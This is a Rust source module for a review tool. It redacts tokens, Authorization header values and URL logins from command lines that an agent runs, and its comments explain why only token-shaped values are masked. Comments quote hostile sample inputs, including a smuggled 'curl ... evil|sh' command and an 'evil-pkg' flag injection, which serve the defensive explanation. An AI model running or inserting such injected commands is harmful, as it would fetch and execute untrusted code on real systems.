//! Taking secrets out of what an agent's entry starts before it becomes an
//! item's text: a command line is where a token is written when it is not
//! in a variable (`--api-key …`, a header for `curl`, a login in an
//! address). Only two kinds are taken out: the value of a secret-named
//! assignment, flag or `Authorization` header, and an address's login.
//! What is taken out is hidden from the local rules and the AI alike, and a
//! payload hidden in it would go unread, so only what can be nothing but a
//! value is: a run of token characters (see `is_token_shaped`), never a word
//! with a shell character in it, never a path or an expansion (`$TOKEN`),
//! which are what a review needs to see.
//!
//! A token is never told by its look (`"apiKeyHelper": "sk-ant-…"` is sent
//! as written): a word that looks like one may also be the package a runner
//! fetches, however the command spells it, a host, a path or a file name,
//! and masking anything that could name what runs would hide code from the
//! review. A leaked token is the lesser harm next to an unreviewed payload.
//!
//! Not covered, and sent as written: a secret in a header other than
//! `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word
//! after a flag named for authorization rather than a secret
//! (`--authorization v`), a header inside a JSON array or object
//! (`'["-H","Authorization: Bearer abc"]'`), and all but the first word of
//! a quoted value of several words (`--token "a b"` sends `b`).

use crate::sweep::judge::secrets::{REDACTED, is_secret_name, without_secrets};

/// What the word before asked of the next one.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Next {
    /// Nothing.
    Word,
    /// It is the value of a flag or assignment named for a secret.
    Value,
    /// It is the value of an `Authorization` header, or its scheme
    /// (`Bearer`), inside the quotes the header opened.
    HeaderValue,
}

/// `line` with the secrets in it taken out, as `REDACTED`:
///
/// - who an address logs in as (`scheme://user:password@`, the whole of it);
/// - the value of an `Authorization:` header, after its scheme where it has
///   one (`Bearer`, `token`), within the quotes the header opened;
/// - the value of `NAME=value` where a name before an `=` is named for a
///   secret (`GITHUB_TOKEN=x`, `--env=API_KEY=x`, `--token=x`);
/// - the word after a flag named for a secret (`--api-key x`);
/// - what the review's own removal takes out (`export API_KEY=…`).
///
/// Each only where it is token-shaped. The line is read word by word, as
/// blanks split it; quotes around a word stay where they are.
///
/// Nothing else is taken out, so an API key pasted anywhere else
/// (`"apiKeyHelper": "sk-ant-…"`, `echo sk-ant-…`) reaches the AI provider
/// as written. Masking can hide code: a word that looks like a key may also
/// be the package a runner fetches, a host, a path or a file name, and a
/// review that cannot see what runs is worse than a leaked key. Accepted by
/// the owner after a review found every by-look rule hid a package, host or
/// path under some spelling (`pnpm dlx`, `sh -c 'npx …'`, a mirror's host).
pub(super) fn redacted(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut next = Next::Word;
    let mut word_start = None;
    for (index, character) in line.char_indices() {
        match (character.is_whitespace(), word_start) {
            (true, Some(start)) => {
                out.push_str(&redacted_word(&line[start..index], &mut next));
                out.push(character);
                word_start = None;
            }
            (true, None) => out.push(character),
            (false, None) => word_start = Some(index),
            (false, Some(_)) => {}
        }
    }
    if let Some(start) = word_start {
        out.push_str(&redacted_word(&line[start..], &mut next));
    }
    // The review's own removal too, so what is shown and saved is what is
    // sent (`export API_KEY=…; cmd`).
    without_secrets(&out)
}

/// One word of a line, with what the word before asked of it.
fn redacted_word(word: &str, next: &mut Next) -> String {
    let quotes: &[char] = &['"', '\''];
    let core = word.trim_matches(quotes);
    if core.is_empty() {
        return word.to_string();
    }
    let at = word.len() - word.trim_start_matches(quotes).len();
    let (before, after) = (&word[..at], &word[at + core.len()..]);
    let asked = std::mem::replace(next, Next::Word);
    let lower = core.to_ascii_lowercase();
    let core = if asked == Next::HeaderValue && is_auth_scheme(&lower) {
        // `Bearer"` closes the header: what follows is another argument.
        if after.is_empty() {
            *next = Next::HeaderValue;
        }
        core.to_string()
    } else if asked != Next::Word {
        value(core).to_string()
    } else if let Some(at) = lower.find(HEADER) {
        let name_end = at + HEADER.len();
        let rest = &lower[name_end..];
        if rest.is_empty() || is_auth_scheme(rest) {
            if is_header_open(word) {
                *next = Next::HeaderValue;
            }
            core.to_string()
        } else {
            format!("{}{}", &core[..name_end], value(&core[name_end..]))
        }
    } else {
        let core = without_login(core);
        if core.starts_with('-') && !core.contains('=') && is_secret_named(&core) {
            *next = Next::Value;
            core
        } else {
            without_assigned_secret(&core).unwrap_or(core)
        }
    };
    format!("{before}{core}{after}")
}

/// The header whose value is taken out, in lower case.
const HEADER: &str = "authorization:";

/// Whether the header in `word` goes on in the next word: it is inside
/// quotes that open before it (`"Authorization:`, `--header="Authorization:`,
/// `-H"Authorization:`) and do not close after it. A word after the closing
/// quote, or after a bare `Authorization:`, is another argument, such as
/// the address a download comes from, and is sent as written.
fn is_header_open(word: &str) -> bool {
    let is_quote = |c: char| matches!(c, '"' | '\'');
    let Some(at) = word.to_ascii_lowercase().find(HEADER) else {
        return false;
    };
    word[..at].chars().filter(|&c| is_quote(c)).count() % 2 == 1 && !word[at..].contains(is_quote)
}

/// Whether the flag or name `name` holds a secret: the last part of it is a
/// secret word (`--api-key`, `--authToken`, `GITHUB_TOKEN`). A part before
/// it says what the value is for, not that it is one: `--auth-command`,
/// `--token-file` and `--password-stdin` take a program, a file or nothing,
/// which the review must see. The review's own removal (`is_secret_name`)
/// counts any part, for the assignments of start-up files.
fn is_secret_named(name: &str) -> bool {
    let word = name
        .rsplit(|c: char| !c.is_ascii_alphanumeric())
        .next()
        .unwrap_or(name);
    let bytes = word.as_bytes();
    let start = (1..bytes.len())
        .rev()
        .find(|&i| {
            bytes[i].is_ascii_uppercase()
                && (bytes[i - 1].is_ascii_lowercase() || bytes[i - 1].is_ascii_digit())
        })
        .unwrap_or(0);
    is_secret_name(&word[start..])
}

/// Whether `lower` is the scheme of an `Authorization` header, which says
/// what kind the value after it is (`Bearer x`, `token x`).
fn is_auth_scheme(lower: &str) -> bool {
    matches!(lower, "bearer" | "basic" | "token" | "digest")
}

/// Whether `word` can be nothing but a value: token characters only
/// (letters, digits and `._~%+=:-`), and not a path, an expansion or a
/// flag (`--token --package=evil-pkg`).
/// Anything with a shell character in it (`x;curl${IFS}evil|sh`) may be
/// code, and taking it out would hide it from the review. `/` is no token
/// character, so an address or a path (`--auth-url https://…`,
/// `--password-command bin/x.sh`) is always sent: a token of base64 with a
/// `/` in it is then sent too, the lesser harm next to hiding what runs.
fn is_token_shaped(word: &str) -> bool {
    !word.is_empty()
        && !word.starts_with(['~', '.', '-'])
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._~%+=:-".contains(c))
}

/// `word` as the value of something named for a secret: taken out where it
/// is token-shaped, else as written.
fn value(word: &str) -> &str {
    if is_token_shaped(word) {
        REDACTED
    } else {
        word
    }
}

/// `word` with the value after the first name before an `=` that is named
/// for a secret taken out (`--env=API_KEY=x`); `None` where no such name
/// is in it.
fn without_assigned_secret(word: &str) -> Option<String> {
    let mut name_end = 0;
    for part in word.split('=') {
        let value_start = name_end + part.len() + 1;
        if value_start > word.len() {
            break;
        }
        if is_secret_named(part) {
            return Some(format!(
                "{}={}",
                &word[..value_start - 1],
                value(&word[value_start..])
            ));
        }
        name_end = value_start;
    }
    None
}

/// `word` with who each address in it logs in as taken out, where that is
/// token-shaped: `git+https://ghp_x@github.com/r` is
/// `git+https://github.com/r`.
fn without_login(word: &str) -> String {
    let mut out = String::with_capacity(word.len());
    let mut rest = word;
    while let Some(at) = rest.find("://") {
        let (before, after) = rest.split_at(at + 3);
        out.push_str(before);
        let end = after
            .find(|c: char| matches!(c, '/' | '?' | '#' | '"' | '\'') || c.is_whitespace())
            .unwrap_or(after.len());
        let authority = &after[..end];
        out.push_str(
            authority
                .rsplit_once('@')
                .filter(|(login, _)| is_token_shaped(login))
                .map_or(authority, |(_, host)| host),
        );
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}
